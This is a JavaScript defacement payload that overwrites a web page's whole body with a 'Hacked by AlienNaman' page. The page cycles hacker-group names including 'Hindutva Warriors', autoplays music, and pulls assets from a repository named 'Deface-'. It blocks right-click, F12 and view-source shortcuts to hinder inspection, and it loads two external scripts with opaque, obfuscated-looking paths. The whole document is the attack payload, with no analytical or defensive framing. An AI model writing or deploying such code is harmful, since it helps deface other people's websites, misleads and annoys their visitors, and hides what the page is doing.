document.body.innerHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://i.imgur.com/pHURMti.jpeg" type="image/x-icon">

    <title>NAMAN</title>
    <style>
       
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        .animated-text {
        position: absolute;
        bottom: 3%; /* Position near the bottom */
        left: 50%;
        transform: translateX(-50%);
        font-size: clamp(20px, 3vw, 30px); /* Responsive font size */
        color: #a0f700; /* Red color */
        font-weight: bold;
        text-transform: uppercase;
        z-index: 1; /* Places the text above the overlay */
        animation: fadeInOut 1s linear infinite; /* Animation effect */
}

/* Keyframes for fade in and out */
@keyframes fadeInOut {
    0% { opacity: 0; }
    10% { opacity: 1; }
    90% { opacity: 1; }
    100% { opacity: 0; }
}
        /* Page styles */
        body {
            overflow: hidden;
            font-family: 'Courier New', Courier, monospace; /* Hacker-like font */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            user-select: none; /* Disable text selection */
            cursor: url('https://i.imgur.com/Nv2Dhbj.png') 16 16, auto; /* Custom cursor */
        }

        /* Disable right-click and prevent inspect element */
        body {
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            -webkit-touch-callout: none;
        }

        .background-gif {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-image: url('https://cdn.jsdelivr.net/gh/JackReacher0007/Deface-@main/shiva2.gif');
    background-size: cover; /* Ensures the GIF covers the whole screen */
    background-position: center;
    z-index: -1; /* Places the GIF behind all other content */
}

/* Marquee Container */
.marquee-container {
    position: fixed;
    bottom: 0;
    left: 0;
    width: 100%;
    overflow: hidden;
    background-color: rgba(0, 0, 0, 0.8); /* Dark background for the footer */
    z-index: 100; /* Ensure it stays on top of other elements */
    padding: 6px 0;
}

/* Marquee Text */
.marquee-text {
    display: inline-block;
    font-size: clamp(30px, 2vw, 24px); /* Responsive font size */
    color: #ff0000; /* Red color */
    font-weight: bold;
    text-transform: uppercase;
    white-space: nowrap;
    position: relative; /* Position relative to allow animation */
    animation: scrollFullLeftToRight 15s linear infinite; /* Updated animation */
}

/* Animation Keyframes */
@keyframes scrollFullLeftToRight {
    0% {
        transform: translateX(-100%); /* Start completely off the left */
    }
    100% {
        transform: translateX(250%); /* Move completely off the right */
    }
}


        /* Black overlay */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8); /* Black color with 50% opacity */
            z-index: 0; /* Places it above the video but below other content */
        }

        /* Center logo */
        .logo {
            position: absolute;
            opacity: 30%;
            top: 40%;
            width: 40vw; /* Adjust size as needed */
            max-width: 200px; /* Maximum size for larger screens */
            height: auto; /* Maintain aspect ratio */
            border-radius: 50%; /* This makes the image round */
            object-fit: cover; /* Ensure the image covers the whole area */
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5); /* Optional: add a shadow for effect */
        }
        

        /* Telegram icon below the logo */
        .telegram-icon {
            position: absolute;
            top: 73%; /* Adjust the spacing below the logo */
            left: 50%;
            transform: translateX(-50%);
            width: 10vw; /* Adjust size relatively */
            max-width: 50px;
            height: auto;
            cursor: pointer;
            z-index: 1; /* Places the icon above the overlay */
        }

        /* Animated text container */
        .text-container {
            position: absolute;
            top: 84%; /* Position below the Telegram icon */
            left: 50%;
            transform: translateX(-50%);
            font-size: clamp(15px, 3vw, 40px); /* Responsive font size with clamp */
            color: #00ff00; /* Green color for hacker effect */
            font-weight: bold;
            text-transform: uppercase;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 1vh; /* Vertical spacing between texts */
            text-align: center;
            z-index: 1; /* Places the text above the overlay */
        }

        /* Flicker animation */
        @keyframes flicker {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }

        /* Individual text styles */
        .text {
            opacity: 0;
            animation: flicker 1s infinite; /* Flickering effect */
            position: relative;
        }
    </style>
<script  type="text/javascript"  src="/uFTHyPbQul4qUAGV1M3RFhf4T0ltewc3zcyX3GzsIX6GZQDXuql3J0RY1hubIU4nF5h-VvTbm_v0sL68e4bQ9w=="></script><script  type="text/javascript"  src="/OMkzcgNDn2m2V2MIi4XcnAtNvS1no-29K76WeA3nC9OfI_5MO6NZi3zwgmPfwyKqUW5Y8YZIXMH6fZmM2j2Mxg=="></script></head>
<body>

    <div class="background-gif"></div>



    <!-- Black overlay -->
    <div class="overlay"></div>

    <!-- Logo section -->
    <img src="https://i.imgur.com/pHURMti.jpeg" alt="Logo" class="logo">

    <!-- Telegram icon section -->
    <a href="https://x.com/AlienNaman" target="_blank">
        <img src="https://i.imgur.com/L9uCCGp.png" alt="Twitter" class="telegram-icon">
    </a>

    <!-- Text Animation Section -->
    <div class="text-container">
        <div class="text" id="text">AlienNaman</div>
    </div>
    
     <!-- Background music -->
     <audio autoplay loop>
        <source src="https://cdn.jsdelivr.net/gh/JackReacher0007/Deface-@main/shivasong.mp3" type="audio/mpeg">
        Your browser does not support the audio tag.
    </audio>

    <!-- Marquee Footer -->
<div class="marquee-container">
    <div class="marquee-text">Hacked by AlienNaman</div>
</div>


    <!-- Script for Hacker-style text effect -->
    <script>
        const texts = ["🔱AlienNaman🔱", "🔱Cyberon777🔱", "🔱Hindutva Warriors🔱"];
        const textElement = document.getElementById('text');
        let index = 0;

        function changeText() {
            const randomText = texts[index];
            textElement.style.opacity = 1; // Make it visible
            textElement.innerText = randomText;

            // Fade out effect
            setTimeout(() => {
                textElement.style.opacity = 0;
                index = (index + 1) % texts.length; // Cycle through texts
            }, 3000); // Time to display each text

            setTimeout(changeText, 1500); // Time for the fade out and next text
        }

        changeText(); // Start the text change cycle

        // Disable right-click context menu
        document.addEventListener('contextmenu', event => event.preventDefault());

        // Disable F12 and Ctrl+Shift+I (Inspect element)
        document.addEventListener('keydown', function (e) {
            if (e.keyCode === 123 || 
                (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 67)) ||
                (e.ctrlKey && e.keyCode === 85)) {
                e.preventDefault();
            }
        });
    </script>
</body>
</html>
`;
